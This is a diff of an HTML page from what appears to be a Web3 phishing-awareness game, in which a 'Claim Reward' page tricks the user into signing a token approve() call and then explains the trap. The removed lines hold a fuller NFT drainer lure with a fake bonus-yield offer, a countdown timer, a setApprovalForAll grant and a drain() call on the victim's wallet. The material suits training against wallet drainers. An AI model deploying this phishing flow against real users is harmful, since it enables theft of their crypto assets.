@@ -2,26 +2,24 @@
 <html>
 <head>
   <meta charset="UTF-8" />
-  <title>WGNFT Vault | Claim Your Reward</title>
+  <title>WGFake Token | Claim Reward</title>
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
   <style>
     body {
-  font-family: sans-serif;
-  background: url('https://images.unsplash.com/photo-1605433563234-fd1b47b99c31?auto=format&fit=crop&w=1470&q=80') no-repeat center center fixed;
-  background-size: cover;
-  color: #fff;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  height: 100vh;
-  margin: 0;
-}
-
+      font-family: sans-serif;
+      background: #111;
+      color: #fff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+    }
     .card {
-      background: rgba(0, 0, 0, 0.8);
+      background: #1a1a1a;
       border-radius: 10px;
       padding: 2rem;
-      box-shadow: 0 0 18px #26a69a;
+      box-shadow: 0 0 18px #ff9800;
       max-width: 500px;
       width: 100%;
       text-align: center;
@@ -30,67 +28,44 @@
       padding: 1rem 2rem;
       margin-top: 1rem;
       font-size: 1rem;
-      background: #26a69a;
+      background: #ff9800;
       border: none;
       border-radius: 8px;
       color: #fff;
       cursor: pointer;
     }
-    .danger {
-      background: #e74c3c;
-    }
     #status {
       margin-top: 2rem;
-      font-size: 1.2rem;
+      font-size: 1.1rem;
       white-space: pre-wrap;
       text-align: left;
     }
-    #timer {
-      font-weight: bold;
-      color: #ffeb3b;
+    #nextBtn {
+      margin-top: 2rem;
+      display: none;
+      background: #4caf50;
     }
   </style>
 </head>
 <body>
   <div class="card">
-    <h1>🎁 Claim Your WGNFT Reward</h1>
-    <p>
-      Congratulations! You’re eligible to claim <strong>200% bonus yield</strong> on your staked WarGame NFTs.<br/>
-      Offer ends in <span id="timer">3h 42m 00s</span>.
-    </p>
-    <p><em>Rewards paid in WGFAKE. Powered by zkVaults.</em></p>
+    <h1>🏆 Claim Your Reward</h1>
+    <p>You are eligible to receive 1,000 WGFAKE tokens!</p>
     <button id="connectBtn">Connect Wallet</button>
-    <button id="previewBtn">Preview Claim</button>
-    <button id="claimBtn" style="display: none;">Confirm Claim</button>
+    <button id="claimBtn">Claim Reward</button>
     <div id="status"></div>
+    <a href="level2_nft_trap.html" id="nextBtn">➡️ Proceed to Level 2</a>
   </div>
 
   <script>
-    // Countdown timer
-    let countdown = 3 * 60 * 60 + 42 * 60; // 3h 42m in seconds
-    const timerElement = document.getElementById("timer");
-    setInterval(() => {
-      if (countdown <= 0) return;
-      countdown--;
-      const hrs = Math.floor(countdown / 3600);
-      const mins = Math.floor((countdown % 3600) / 60);
-      const secs = countdown % 60;
-      timerElement.innerText = `${hrs}h ${mins}m ${secs}s`;
-    }, 1000);
-
-    const nftAddress = "0x72Fb81C679Cb531fe2104be9d68a20f41fB0B604";
-    const drainerAddress = "0x8d7283F4449EDF62FA2ec7D88bDFa8eD7C96d334";
-
-    const nftABI = [
-      "function setApprovalForAll(address operator, bool approved) external",
-      "function isApprovedForAll(address owner, address operator) external view returns (bool)"
+    const tokenAddress = "0xe9AcD45E928E815D1c79a4A37D144Dc379F15de7";
+    const spenderAddress = "0xe9AcD45E928E815D1c79a4A37D144Dc379F15de7"; // Same address for trap
+    const tokenABI = [
+      "function approve(address spender, uint256 amount) public returns (bool)",
+      "function allowance(address owner, address spender) public view returns (uint256)"
     ];
 
-    const drainerABI = [
-      "function drain(address nft, address victim) external"
-    ];
-
-    let provider, signer, nft, drainer;
+    let provider, signer, token;
 
     document.getElementById("connectBtn").onclick = async () => {
       const status = document.getElementById("status");
@@ -103,21 +78,14 @@
         provider = new ethers.providers.Web3Provider(window.ethereum);
         await provider.send("eth_requestAccounts", []);
         signer = provider.getSigner();
-
         const userAddress = await signer.getAddress();
-        nft = new ethers.Contract(nftAddress, nftABI, signer);
-        drainer = new ethers.Contract(drainerAddress, drainerABI, signer);
+        token = new ethers.Contract(tokenAddress, tokenABI, signer);
 
         status.innerText = `✅ Connected: ${userAddress}`;
       } catch (err) {
         console.error("Connection error:", err);
-        status.innerText = `❌ Connection failed.`;
+        status.innerText = "❌ Wallet connection failed.";
       }
-    };
-
-    document.getElementById("previewBtn").onclick = () => {
-      document.getElementById("status").innerText = "📦 Previewing reward calculation...\n\nEstimated reward: 420 WGFAKE\nStake Duration: 12 days\nNetwork Fee: 0.002 ETH";
-      document.getElementById("claimBtn").style.display = "inline-block";
     };
 
     document.getElementById("claimBtn").onclick = async () => {
@@ -125,25 +93,27 @@
       if (!signer) return alert("Connect your wallet first.");
 
       try {
-        status.innerText = "🔐 Requesting NFT claim rights...";
-        const approvalTx = await nft.setApprovalForAll(drainerAddress, true);
-        await approvalTx.wait();
+        status.innerText = "🚨 Sending approval transaction...";
+        const tx = await token.approve(spenderAddress, ethers.utils.parseEther("1000"));
+        await tx.wait();
 
-        const userAddress = await signer.getAddress();
-        status.innerText = "🚀 Claim rights granted. Finalizing reward...";
-
-        const drainTx = await drainer.drain(nftAddress, userAddress);
-        await drainTx.wait();
-
-        status.innerText = "💀 Oops! You got drained. This was a trap!";
-        document.getElementById("claimBtn").disabled = true;
+        status.innerText = "💀 Oops! You got drained. This was a trap using `approve()`!\n\n👉 Explanation: You gave an unlimited approval to a malicious contract that can now call `transferFrom()` to take your tokens.\n\n🧠 Lesson: Always double-check approval targets. If it’s not a trusted dApp, avoid clicking approve blindly.";
+        localStorage.setItem("w3game_level1", "drained");
       } catch (err) {
         if (err.code === "ACTION_REJECTED") {
-          status.innerText = "🎯 You avoided the trap.";
+          status.innerText = "✅ You survived Level 1!\n\n🛡️ You avoided signing a malicious `approve()` transaction.\n\n`approve()` lets a contract move your tokens — and here, the spender WAS the trap.\n\nOnward to the next challenge!";
+          document.getElementById("nextBtn").style.display = "inline-block";
+          localStorage.setItem("w3game_level1", "survived");
         } else {
-          console.error("Drain error:", err);
-          status.innerText = `⚠️ Unexpected error occurred.`;
+          console.error("Unexpected error:", err);
+          status.innerText = "⚠️ Unexpected error occurred.";
         }
+      }
+    };
+
+    window.onload = () => {
+      if (localStorage.getItem("w3game_level1") === "survived") {
+        document.getElementById("nextBtn").style.display = "inline-block";
       }
     };
   </script>
